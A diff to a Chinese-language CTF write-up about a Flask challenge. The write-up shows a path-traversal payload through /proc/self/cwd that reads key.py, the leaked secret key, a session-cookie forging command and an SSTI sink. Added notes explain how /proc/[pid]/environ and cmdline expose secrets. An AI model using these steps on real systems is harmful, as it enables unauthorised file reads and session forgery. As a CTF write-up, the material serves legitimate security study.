@@ -184,7 +184,7 @@ def article():
 ```
 审计后可以发现：
 -  `flag`被过滤: ```if page.find('flag')>=0:  page = 'notallowed.txt' ```
--  此处代码将SEESION中的值直接拼接到template中，且使用`render_template_string`进行渲染和输出，存在`SSTI`:
+-  此处代码将SEESION中的变量[n1code]的值直接拼接到template中，且使用`render_template_string`进行渲染和输出，存在`SSTI`:
 ```python
     if session['n1code'] is not None:
          template = '''<h1>N1 Page</h1> <div class="row>
@@ -194,7 +194,8 @@ def article():
           session['n1code'] = None 
    return render_template_string(template)
 ```
-- `appkey`在`key.py`中: `?name=./../../../proc/self/cwd/key.py`
+- 伪造session用的`key`在`key.py`中: `?name=./../../../proc/self/cwd/key.py`
+
 ![](pic/afr3_5.png)
 `Drmhze6EPcv0fN_81Bj-nA`
 
@@ -209,5 +210,13 @@ python flask_session_cookie_manager3.py  encode -s "Drmhze6EPcv0fN_81Bj-nA" -t "
 ![](pic/afr3_7.png)
 
 
-漏洞利用详解[python-flask-ssti(模版注入漏洞)](https://www.cnblogs.com/hackxf/p/10480071.html)
+>漏洞利用详解[python-flask-ssti(模版注入漏洞)](https://www.cnblogs.com/hackxf/p/10480071.html)
 
+> [linux proc 目录利用](../doc/afr.md)
+> 
+> /proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。
+> - 目录下的cmdline可读出比较敏感的信息：/proc/[pid]/cmdline
+> - 通过cwd命令可以直接跳转到当前目录:/proc/[pid]/cwd ，
+> - 环境变量中可能存在secret_key，这时也可以通过environ进行读取：/proc/[pid]/environ
+>
+> **其中pid可用self代替，表示当前用户进程**
